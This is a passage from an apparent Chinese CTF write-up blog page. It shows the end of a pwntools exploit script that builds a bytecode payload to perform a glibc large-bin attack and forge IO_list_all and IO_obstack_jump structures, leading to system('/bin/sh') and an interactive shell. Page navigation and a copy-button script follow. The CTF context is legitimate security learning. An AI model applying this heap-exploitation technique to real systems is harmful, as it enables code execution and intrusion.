+<span class="line"><span style="color:#6A737D"># 准备chunk</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x03\xa0\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x04\x80\x04</span><span style="color:#032F62">'</span><span style="color:#6A737D">  #防合并</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x05\x80\x04</span><span style="color:#032F62">'</span><span style="color:#6A737D">  #防合并</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 进行内容伪造</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x04\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\x3c\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x00\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(binsh_offset)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\x38\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x04\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\x2c\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x00\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#6A737D">#以下就是绕过截断</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(system_offset</span><span style="color:#D73A49">-0x</span><span style="color:#005CC5">600</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">600</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\x28\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x04\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\xcc\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x00\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(</span><span style="color:#005CC5">IO_obstack_jump</span><span style="color:#D73A49">+0x</span><span style="color:#005CC5">20</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49">b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\xc8\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x0c\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\xd4\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x08\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(</span><span style="color:#D73A49">0x</span><span style="color:#005CC5">910</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x02\xd0\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">#large bins atk</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd4\x03</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x03\xb0\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd4\x02</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#032F62">edit</span></span>
+<span class="line"><span style="color:#032F62">'''</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x04\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x01\xbc\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x00\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(</span><span style="color:#005CC5">IO_list_all</span><span style="color:#D73A49">-0x</span><span style="color:#005CC5">20</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x01\xb8\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd3\x02\xc0\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># 内容伪造的最后一部分</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd1\x00\x40\x00</span><span style="color:#032F62">'</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xf1</span><span style="color:#032F62">'</span><span style="color:#D73A49">+</span><span style="color:#24292E">p32(</span><span style="color:#005CC5">1</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#24292E">payload </span><span style="color:#D73A49">+=</span><span style="color:#D73A49"> b</span><span style="color:#032F62">'</span><span style="color:#005CC5">\xd2\x04\xd0\x04</span><span style="color:#032F62">'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.sendline(payload)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">io.interactive()</span></span></code></pre></div><nav class="pager" aria-label="同分类内的上一篇 / 下一篇" data-astro-cid-tldeq5d5><div class="pager-item" data-astro-cid-tldeq5d5><span class="pager-label" data-astro-cid-tldeq5d5>← 上一篇</span><a href="/posts/xyctf2024/" data-astro-cid-tldeq5d5>XYCTF 2024 复现</a></div><div class="pager-item next" data-astro-cid-tldeq5d5><span class="pager-label" data-astro-cid-tldeq5d5>下一篇 →</span><a href="/posts/hgame2025-wp/" data-astro-cid-tldeq5d5>HGAMECTF 2025</a></div></nav></article></div></main><footer class="colophon" data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="links" data-astro-cid-jo6i4kqk><a href="/posts" data-astro-cid-jo6i4kqk>归档</a><a href="/tags" data-astro-cid-jo6i4kqk>标签</a></p><p class="sign" data-astro-cid-jo6i4kqk>Findkey · 二〇二六</p></div></footer><script type="module">function e(e){let t=document.createElement(`textarea`);t.value=e,t.setAttribute(`readonly`,``),t.style.position=`fixed`,t.style.top=`-1000px`,document.body.appendChild(t),t.select();let n=!1;try{n=document.execCommand(`copy`)}catch{n=!1}return t.remove(),n}async function t(t,n){let r=n.textContent;try{if(navigator.clipboard?.writeText)await navigator.clipboard.writeText(t);else if(!e(t))throw Error(`copy failed`);n.textContent=`已复制`}catch{n.textContent=e(t)?`已复制`:`复制失败`}setTimeout(()=>{n.textContent=r},1400)}function n(e){if(e.closest(`.code-block`))return;let n=document.createElement(`div`);n.className=`code-block`,e.parentNode?.insertBefore(n,e);let r=(e.textContent??``).replace(/\n$/,``),i=r.split(`
+`).length,a=document.createElement(`div`);a.className=`code-head`;let o=document.createElement(`button`);if(o.type=`button`,o.className=`code-btn`,o.textContent=`复制`,o.addEventListener(`click`,()=>t(r,o)),a.appendChild(o),n.appendChild(a),i>26){let t=document.createElement(`div`);t.className=`code-body is-folded`,t.style.maxHeight=`21rem`,t.appendChild(e),n.appendChild(t);let r=document.createElement(`button`);r.type=`button`,r.className=`code-more`,r.textContent=`展开（共 ${i} 行）`,r.addEventListener(`click`,()=>{let e=t.classList.toggle(`is-folded`);t.style.maxHeight=e?`21rem`:`none`,r.textContent=e?`展开（共 ${i} 行）`:`收起`,e&&n.getBoundingClientRect().top<60&&n.scrollIntoView({behavior:`smooth`,block:`nearest`})}),n.appendChild(r)}else n.appendChild(e)}function r(){document.querySelectorAll(`.prose pre`).forEach(n)}r(),document.addEventListener(`astro:page-load`,r);</script></body></html>
